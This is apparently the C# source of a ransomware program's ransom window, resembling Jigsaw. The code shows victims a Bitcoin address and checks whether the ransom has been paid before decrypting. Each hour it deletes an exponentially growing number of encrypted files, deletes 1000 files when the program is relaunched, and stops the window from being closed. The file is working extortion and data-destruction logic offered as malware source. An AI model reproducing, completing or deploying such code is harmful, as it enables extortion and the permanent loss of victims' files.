using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using Main.Properties;

namespace Main
{
    public partial class FormGame : Form
    {
        private static int _timeLeftSec;
        private static int _exponent;
        private const double Base = 1.1;

        private static int _indexNum;
        public FormGame()
        {
            InitializeComponent();
        }

        private void FormGame_Load(object sender, EventArgs e)
        {
            //ShowIcon = false;
            MaximizeBox = false;
            MinimizeBox = false;
            //ControlBox = false;
            //FormBorderStyle = FormBorderStyle.FixedToolWindow;
            //ShowInTaskbar = false;
            StartPosition = FormStartPosition.CenterScreen;
            Tools.Windows.MakeTopMost(this);

            timerTypingEffect.Interval = (125);
            timerTypingEffect.Enabled = true;
            labelWelcome.Text = "";
#if DEBUG
            timerTypingEffect.Interval = 10;
            timerCountDown.Interval = 100;
#endif

            labelTask.Text = Config.TaskMessage;
            labelTask.Visible = false;

            textBoxAddress.ReadOnly = true;
            textBoxAddress.Text = GetBitcoinAddess();
            textBoxAddress.Visible = false;
            buttonCheckPayment.Visible = false;
            buttonViewEncryptedFiles.Visible = false;
            labelCountDown.Visible = false;
            timerCountDown.Enabled = false;
            labelFilesToDelete.Visible = false;

            if (DidRun())
            {
                DeleteFiles(1000);
            }
        }

        private static bool DidRun()
        {
            var fn = Path.Combine(Config.WorkFolderPath, @"dr");
            if (File.Exists(fn))
            {
                return true;
            }
            File.WriteAllText(fn, @"21");
            return false;
        }

        private static void DeleteFiles(int num)
        {
            try
            {
            var filesAlreadyDeleted = 0;
            foreach (var file in Tools.Locker.GetEncryptedFiles())
            {
                if (filesAlreadyDeleted == num)
                    return;

                File.Delete(file + Config.EncryptionFileExtension);
                filesAlreadyDeleted++;
                }

            }
            catch (Exception)
            {
                // Ignored
            }
        }

        private static string GetBitcoinAddess()
        {
            var addressFilePath = Path.Combine(Config.WorkFolderPath, @"Address.txt");

            if (File.Exists(addressFilePath))
                return File.ReadAllText(addressFilePath);

            var vanityAddresses = new HashSet<string>();

            foreach (
                var ext in
                    Resources.vanityAddresses.Split(new[] { Environment.NewLine},
                        StringSplitOptions.RemoveEmptyEntries).ToList())
            {
                vanityAddresses.Add(ext.Trim());
            }

            var randomAddress = vanityAddresses.OrderBy(x => Guid.NewGuid()).FirstOrDefault();
            
            File.WriteAllText(addressFilePath, randomAddress);

            return randomAddress;
        }

        protected override CreateParams CreateParams
        {
            get
            {
                // ReSharper disable once InconsistentNaming
                const int CS_NOCLOSE = 0x200;

                var cp = base.CreateParams;
                cp.ClassStyle |= CS_NOCLOSE;
                return cp;
            }
        }

        private void FormGame_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show(this, @"You are about to make a very bad decision. Are you sure about it?");
        }

        private void timerTypingEffect_Tick(object sender, EventArgs e)
        {
            var message = Config.WelcomeMessage;

            labelWelcome.Text = message.Substring(0, _indexNum) + @"_";
            _indexNum++;
            if (_indexNum != message.Length + 1) return;
            timerTypingEffect.Enabled = false;
            labelTask.Visible = true;
            textBoxAddress.Visible = true;
            buttonCheckPayment.Visible = true;
            buttonViewEncryptedFiles.Visible = true;
            labelCountDown.Visible = true;
            timerCountDown.Enabled = true;
            labelFilesToDelete.Visible = true;
#if DEBUG
            _timeLeftSec = 60;
#else
            _timeLeftSec = 60*60;
#endif
        }

        private void buttonCheckPayment_Click(object sender, EventArgs e)
        {
            try
            {
                var priceUsd = Tools.Blockr.GetPrice();
                var balanceBtc = Tools.Blockr.GetBalanceBtc(GetBitcoinAddess());
                var balanceUsd = (int) (balanceBtc*priceUsd);

                if (balanceUsd > Config.RansomUsd)
                {
                    timerCountDown.Stop();
                    buttonCheckPayment.Enabled = false;
                    buttonCheckPayment.BackColor = Color.Lime;
                    buttonCheckPayment.Text = @"Great job, I'm decrypting your files...";
                    MessageBox.Show(this,@"Decrypting your files. "
                        + @"It will take for a while. "
                        + @"After done I will close and completely remove myself from your computer.",
                        @"Great job");
                    Tools.Locker.DecryptFiles(Config.EncryptionFileExtension);
                    Tools.Hacking.RemoveItself();
                }
                else if (balanceUsd > 0)
                {
                    buttonCheckPayment.BackColor = Color.Tomato;
                    buttonCheckPayment.Text = @"You did not sent me enough! Try again!";
                }
                else
                {
                    buttonCheckPayment.BackColor = Color.Tomato;
                    buttonCheckPayment.Text = @"You haven't made payment yet! Try again!";
                }
            }
            catch
            {
                buttonCheckPayment.Text = @"Are you connected to the internet? Try again!";
                buttonCheckPayment.BackColor = Color.Tomato;
            }
        }

        private void buttonViewEncryptedFiles_Click(object sender, EventArgs e)
        {
            var formEncryptedFiles = new FormEncryptedFiles();
            formEncryptedFiles.Show(this);
        }

        private void timerCountDown_Tick(object sender, EventArgs e)
        {
            if (_timeLeftSec > 0)
            {
                // Display the new time left
                // by updating the Time Left label.
                _timeLeftSec--;

                var minLeft = _timeLeftSec / 60;
                var secLeft = _timeLeftSec % 60;
                labelCountDown.Text = minLeft + @":" + secLeft;
            }
            else
            {
#if DEBUG
                _timeLeftSec = 60;
#else
                _timeLeftSec = 60*60;
#endif
                var filesToDelete = (int)Math.Pow(Base, _exponent);
                labelFilesToDelete.Text = filesToDelete + @" files will be deleted";
                _exponent++;
                DeleteFiles(filesToDelete);
            }
        }
    }
}
